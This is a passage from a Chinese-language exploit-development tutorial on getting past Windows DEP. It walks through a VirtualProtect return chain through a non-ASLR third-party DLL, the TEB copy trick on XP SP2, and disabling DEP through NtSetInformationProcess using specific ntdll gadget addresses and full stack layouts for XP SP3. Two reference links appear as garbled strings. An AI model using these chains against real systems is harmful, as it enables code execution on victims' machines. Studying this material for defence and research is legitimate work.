
## 异常例程入口地址与内存布局

异常例程入口地址（若有设置的话，比如`try…catch`）所在位置与填充数据的覆盖区域（`AAAAAAAA……`）如下所示：

```
┃ 异常例程入口地址（若有 ┃　    填充数据的覆盖区域          ┃┃
┃设置的话,比如try…catch)┃       （AAAAAAAA……）           ┃┃
┣━━━━━━━━━━━━┫                                  ┃▼
┃      局部变量          ┃                                  ┃内存低地址
┗━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━┛
```

由于后期系统DLL加入了ASLR保护，因此我们可以选用未开启ASLR的第三方DLL文件，示例如下（这里使用迅雷IE插件）：`XunleiBHO7.1.6.2194.dll`（`DEP/NO ASLR`）

```
.text:211D18F5                 call    ds:VirtualProtect
.text:211D18FB                 pop     esi
.text:211D18FC                 pop     ebp
.text:211D18FD                 retn    0Ch
```

栈空间布局：

```
41414141        垃圾字节（共3088字节）
……
211D18F5        返回地址
41414141        平衡堆栈（视漏洞函数的具体情况而定）
07c50000        lpAddress(shellcode地址)
00001000        dwSize
00000040        flNewProtect (PAGE\_EXECUTE\_READWRITE)
07c50020        lpflOldProtect (可写地址)
41414141        平衡 pop esi 使用的堆栈
41414141        平衡 pop ebp 使用的堆栈
07c50000        返回地址，指向shellcode
```

在一次实际利用中，我使用了COMODO主动防御软件中的`guard32.dll`来定位`VirtualProtect`函数：

```
#1002CA33  -FF25 E8F30310    JMP DWORD PTR DS:[1003F3E8]        [Module : guard32.dll]
# jmp to here
#6FFF04C0   8BFF             MOV EDI,EDI
#6FFF04C2   55               PUSH EBP
#6FFF04C3   8BEC             MOV EBP,ESP
#6FFF04C5  -E9 E64BFF06      JMP kernel32.76FE50B0
# jmp to here
#76FE50B0   5D               POP EBP
#76FE50B1  ^E9 02D0FBFF      JMP <JMP.&API-MS-Win-Core-Memory-L1-1-0.VirtualProtect>
# jmp to here
#76FA20B8  -FF25 1019FA76    JMP DWORD PTR DS:[<&API-MS-Win-Core-Memory-L1-1-0.VirtualProtect>; KERNELBA.VirtualProtect
```

关于`ret2lib`技术的更多信息可参考资料：`59dK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3W2F1k6X3!0K6k6h3y4%4M7X3W2@1k6i4u0K6i4K6u0W2j5$3!0E0i4K6u0r3N6r3g2^5N6q4)9#2k6Y4u0W2M7$3!0#2M7X3y4W2M7#2)9J5c8Y4m8V1k6W2)9J5c8Y4u0W2N6s2g2J5L8W2)9J5k6s2c8G2i4K6u0V1L8r3W2T1j5#2)9J5k6i4m8V1k6R3`.`.

## 2. 利用TEB突破DEP

在之前的《黑客防线》中有篇文章《SP2下利用TEB执行ShellCode》，有兴趣的读者可以翻看黑防出版的《缓冲区溢出攻击与防范专辑》，上面有这篇文章。该作者在文中提到一种利用TEB（线程环境块）来突破DEP的方法，不过它受系统版本限制，只能在`XP sp2`及其以下版本的Windows系统上使用，因为更高版本的系统，其TEB地址是不固定的，每次都是动态生成的。该方法的具体实现方法如下：

1. 将返回地址覆盖成字符串复制函数的地址，比如`lstrcpy`、`memcpy`等等；
2. 在返回地址之后用目标内存地址和`shellcode`地址覆盖，当执行复制操作时，就会将`shellcode`复制到目标内存地址，该目标内存地址位于TEB偏移`0xC00`的地方，它有520字节缓存用于`ANSI-to-Unicode`函数的转换；
3. 复制操作结束后返回到`shellcode`地址并执行它。

此时其堆栈布局如下：

```
┏━━━━━━━┓
【shellcode        】
【save ebp        】
【lstrcpy        】
【TEB缓存地址        】<= 用于复制结束后返回到shellcode
【TEB缓存地址        】
【ShellCode地址        】
┗━━━━━━━┛
```

## 3. 利用NtSetInformationProcess关闭DEP

关于此方法最原始的资料应该是黑客杂志《uninformed》上的文章《Bypassing Windows Hardware-enforced Data Execution Prevention》（`6b1K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4g2F1K9h3&6X3L8%4u0E0k6h3c8Q4x3X3g2G2M7X3N6Q4x3V1k6Q4x3@1k6$3i4K6y4p5x3W2)9J5y4X3q4Q4x3@1b7@1i4@1g2r3i4@1u0o6i4K6R3&6i4@1g2r3i4@1u0o6i4K6S2o6i4@1f1#2i4K6S2r3i4@1p5$3i4@1f1#2i4@1p5@1i4K6V1$3i4@1f1@1i4@1t1&6i4K6W2r3i4@1f1#2i4K6S2r3i4@1q4r3i4@1f1@1i4@1u0n7i4@1p5#2i4@1f1%4i4K6W2o6i4K6S2n7i4@1f1@1i4@1t1^5i4K6S2n7i4@1f1$3i4K6W2o6i4@1q4o6i4@1f1@1i4@1u0m8i4@1u0m8i4@1f1@1i4@1t1&6i4K6S2n7i4@1f1#2i4K6R3&6i4K6S2p5i4@1f1%4i4@1u0r3i4@1u0n7i4@1f1^5i4@1q4r3i4K6V1I4i4@1f1%4i4K6W2m8i4K6R3@1i4@1f1K6i4K6R3H3i4K6S2m8i4@1f1%4i4@1q4m8i4K6R3I4i4@1f1%4i4@1p5H3i4@1t1@1N6$3W2F1x3U0l9H3x3H3`.`. sp2中基于硬件的DEP》（http://bbs.pediy.com/showthread.php?t=99045），此方法的主要原理就是利用`NtSetInformationProcess()`函数来设置`KPROCESS`结构中的相关标志位，进而关闭DEP，`KPROCESS`结构中相关标志位情况如下：

```
0:000> dt nt!\_KPROCESS -r
ntdll!\_KPROCESS
. . .
+0x06b Flags                         : \_KEXECUTE\_OPTIONS
        +0x000 ExecuteDisable                 : Pos 0, 1 Bit
        +0x000 ExecuteEnable                 : Pos 1, 1 Bit
        +0x000 DisableThunkEmulation         : Pos 2, 1 Bit
        +0x000 Permanent                 : Pos 3, 1 Bit
        +0x000 ExecuteDispatchEnable         : Pos 4, 1 Bit
        +0x000 ImageDispatchEnable         : Pos 5, 1 Bit
        +0x000 Spare                         : Pos 6, 2 Bits
```

当DEP被启用时，`ExecuteDisable`被置位，当DEP被禁用，`ExecuteEnable`被置位，当`Permanent`标志置位时表示这些设置是最终设置，不可更改。代码实现：

```c
ULONG ExecuteFlags = MEM\_EXECUTE\_OPTION\_ENABLE;
NtSetInformationProcess(
        NtCurrentProcess(),         // ProcessHandle = -1
        ProcessExecuteFlags,         // ProcessInformationClass = 0x22（ProcessExecuteFlags）
        &ExecuteFlags,                 // ProcessInformation = 0x2（MEM\_EXECUTE\_OPTION\_ENABLE）
        sizeof(ExecuteFlags));         // ProcessInformationLength = 0x4
```

具体实现思路（以我电脑上`VirtualBox`虚拟机下的`xp sp3`为例）：

1. 将`al`设置为1，比如指令`mov al,1 / ret`，然后用该指令地址覆盖返回地址：

```
0:000> lmm ntdll
start    end        module name
7c920000 7c9b3000   ntdll      (pdb symbols)          c:\symbollocal\ntdll.pdb\1751003260CA42598C0FB326585000ED2\ntdll.pdb
0:000> s 7c920000 l 93000 b0 01 c2 04
7c9718ea  b0 01 c2 04 00 90 90 90-90 90 8b ff 55 8b ec 56  ............U..V
0:000> u 7c9718ea
ntdll!NtdllOkayToLockRoutine:
7c9718ea b001            mov     al,1
7c9718ec c20400          ret     4
```

由于上面的`ret 4`，因此要再向栈中填充4字节（比如`0xffffffff`）以抵消多弹出的4字节，如果选择的指令刚好是`ret`则无须再多填充4字节。

2. 跳转到`ntdll!LdrpCheckNXCompatibility`中的部分代码（从`cmp al,1`开始，可通过`windbg`下的命令`uf ntdll!LdrpCheckNXCompatibility`来查看其反汇编代码），比如以下地址就需要用`0x7c93cd24`来覆写堆栈上的第二个地址：

```
ntdll!LdrpCheckNXCompatibility+0x13:
7c93cd24 3c01            cmp     al,1
7c93cd26 6a02            push    2
7c93cd28 5e              pop     esi
7c93cd29 0f84df290200    je      ntdll!LdrpCheckNXCompatibility+0x1a (7c95f70e)  ; 之前已将al置1，故此处实现跳转
```

3. 上面跳转后来到这里：

```
0:000> u 7c95f70e
ntdll!LdrpCheckNXCompatibility+0x1a:
7c95f70e 8975fc          mov     dword ptr [ebp-4],esi        ; [ebp-0x4]= esi = 2
;执行到这里的时候会发现ebp-4(41414141-4 = 4141413d)而导致不可写，因此我们需要在前面调整下ebp的值，比如可以使用以下指令：
;- push esp / pop ebp / ret
;- mov esp,ebp / ret
;或者其它可调整ebp为可写地址的指令
7c95f711 e919d6fdff      jmp     ntdll!LdrpCheckNXCompatibility+0x1d (7c93cd2f)
```

4. 上面跳转后来到：

```
0:000> u 7c93cd2f
ntdll!LdrpCheckNXCompatibility+0x1d:
7c93cd2f 837dfc00        cmp     dword ptr [ebp-4],0
7c93cd33 0f85f89a0100    jne     ntdll!LdrpCheckNXCompatibility+0x4d (7c956831) ; 由于不相等再次实现跳转
```

5. 上面跳转后来到：

```
0:000> u 7c956831
ntdll!LdrpCheckNXCompatibility+0x4d:
7c956831 6a04            push    4                 ;ProcessInformationLength = 4
7c956833 8d45fc          lea     eax,[ebp-4]
7c956836 50              push    eax            ;ProcessInformation = 2（MEM\_EXECUTE\_OPTION\_ENABLE）
7c956837 6a22            push    22h                   ;ProcessInformationClass = 0x22（ProcessExecuteFlags）
7c956839 6aff            push    0FFFFFFFFh
7c95683b e84074fdff      call    ntdll!ZwSetInformationProcess (7c92dc80)
7c956840 e92865feff      jmp     ntdll!LdrpCheckNXCompatibility+0x5c (7c93cd6d)
7c956845 90              nop
```

在这里调用函数`ZwSetInformationProcess()`，而其参数也刚好达到我们关闭DEP的各项要求。

6. 最后跳转到函数结尾：

```
0:000> u 7c93cd6d
ntdll!LdrpCheckNXCompatibility+0x5c:
7c93cd6d 5e              pop     esi
7c93cd6e c9              leave
7c93cd6f c20400          ret     4
```

最后的堆栈布局应为：

```
┏━━━━━━━━━━━━━━━━┓
【        AAA……                          】         <= 填充数据
【        push esp/pop ebp/ret          】        <= 调整ebp为可写地址
【        al=1地址                  】        <= 返回地址
【        0xffffffff                  】        <= 平衡堆栈
【LdrpCheckNXCompatibility指令地址】        <= 指令cmp al,0x1 的起始地址
【        0xffffffff                  】        <= 平衡堆栈
【        "A" x 54                   】        <= 调整NX禁用后的堆栈
【        call/jmp esp                  】
【        shellcode                  】
┗━━━━━━━━━━━━━━━━┛
```

如果在禁用NX后，又需要读取`esi`或`ebp`，但此时它们又被我们填充的数据覆盖掉了，那么我们可以使用诸如`push esp/pop esi/ret`或者`push esp/pop ebp/ret`这样的指令来调整`esi`和`ebp`，以使关闭DEP后还能够正常执行。

辅助工具：`ImmDbg` pycommand插件（`!pvefindaddr depxpsp3` + `!findantidep`）

## 4. 利用SetProcessDEPPolicy来关闭DEP

适用在：`Windows XP SP3`，`Vista SP1`和`Windows 2008`。

为了能使这个函数有效，当前的DEP策略必须设成`OptIn`或者`OptOut`。如果策略被设成`AlwaysOn`（或者`AlwaysOff`），然后`SetProcessDEPPolicy`将会抛出一个错误。如果一个模块是以`/NXCOMPAT`链接的，这个技术也将不会成功。最后，同等重要的是，它只能被进程调用一次。因此如果这个函数已经被当前进程调用（如`IE8`，当程序开始时已经调用它），它将不成功。

`Bernardo Damele`写了一篇关于这一技术的博文。
